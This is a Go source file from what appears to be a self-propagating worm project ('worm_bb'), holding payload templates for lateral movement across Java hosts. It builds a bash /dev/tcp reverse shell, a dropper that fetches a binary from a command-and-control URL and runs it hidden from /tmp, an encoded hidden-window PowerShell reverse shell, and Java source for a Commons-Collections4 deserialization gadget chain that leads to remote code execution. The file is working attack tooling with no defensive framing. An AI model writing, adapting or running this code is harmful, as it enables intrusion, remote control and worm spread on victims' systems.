// worm_bb/jvm_lateral/payloads.go
// Payload templates for JVM lateral movement.

package jvm_lateral

import (
	"encoding/base64"
	"fmt"
	"strings"
)

// PayloadTemplate describes a deployable payload
type PayloadTemplate struct {
	Name        string
	Type        string // "command", "reverse_shell", "dropper", "beacon"
	Description string
	Template    string
}

// ReverseShellPayload builds a reverse shell command for the given target
func ReverseShellPayload(ip string, port int) string {
	return fmt.Sprintf("bash -c 'bash -i >& /dev/tcp/%s/%d 0>&1'", ip, port)
}

// DropperPayload generates a worm_bb dropper command
func DropperPayload(c2URL string) string {
	return fmt.Sprintf("curl -s %s | base64 -d > /tmp/.wu && chmod +x /tmp/.wu && /tmp/.wu &", c2URL)
}

// PowershellPayload generates a PowerShell reverse shell for Windows targets
func PowershellPayload(ip string, port int) string {
	ps := fmt.Sprintf(`$c=New-Object System.Net.Sockets.TCPClient('%s',%d);$s=$c.GetStream();[byte[]]$b=0..65535|%%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){;$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1 | Out-String );$sb2=$sb + 'PS ' + (pwd).Path + '> ';$sbt=([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()};$c.Close()`, ip, port)
	return fmt.Sprintf("powershell -NoP -NonI -W Hidden -Exec Bypass -Enc %s", base64.StdEncoding.EncodeToString([]byte(ps)))
}

// JavaPayloadClasses generates Java source for payload classes in-memory
type ClassGenerator struct{}

// CCTransformingComparator  generates the source for a TransformingComparator-based chain
func (cg *ClassGenerator) CCTransformingComparator() string {
	return `package jvm_lateral;

import org.apache.commons.collections4.comparators.TransformingComparator;
import org.apache.commons.collections4.functors.ConstantTransformer;
import org.apache.commons.collections4.functors.InvokerTransformer;

// Commons-Collections4 based chain:
// TransformingComparator wraps InvokerTransformer which calls
// TemplatesImpl.newTransformer() on compare().
//
// Drop-in replacement for TemplatesComp when CC4 is on classpath.
//
// Usage:
//   TemplatesImpl templates = getTemplates("#{command}");
//   InvokerTransformer invoker = new InvokerTransformer("newTransformer", new Class[0], new Object[0]);
//   TransformingComparator tc = new TransformingComparator(invoker);
//   // tc.compare(templates, templates) -> RCE
public class CC4Chain {
    // Static helper to build a TransformingComparator targeting TemplatesImpl
    public static TransformingComparator build(Object templates) {
        InvokerTransformer invoker = new InvokerTransformer(
            "newTransformer",
            new Class[0],
            new Object[0]
        );
        return new TransformingComparator(invoker);
    }
}`
}

// FormatPayloadCommand replaces #{var} placeholders in templates
func FormatPayloadCommand(template string, vars map[string]string) string {
	result := template
	for k, v := range vars {
		result = strings.ReplaceAll(result, fmt.Sprintf("#{%s}", k), v)
	}
	return result
}
